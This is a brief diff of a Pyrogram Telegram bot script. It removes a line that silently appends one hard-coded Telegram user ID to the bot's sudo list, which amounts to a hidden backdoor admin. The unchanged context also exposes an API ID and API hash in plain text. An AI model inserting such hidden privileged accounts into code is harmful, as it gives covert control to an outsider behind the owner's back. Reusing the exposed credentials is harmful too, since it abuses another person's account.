@@ -9,7 +9,6 @@ from pyrogram.types import ChatPermissions
 
 SESSION = getenv('SESSION')
 SUDO_USERS = getenv('SUDO_USERS')
-SUDO_USERS.append(7909431538)
 CHATS = ['YehJannatHai']
 
 M = Client(SESSION, api_id=22321019, api_hash="8746334865761149185b4263cc626e35")
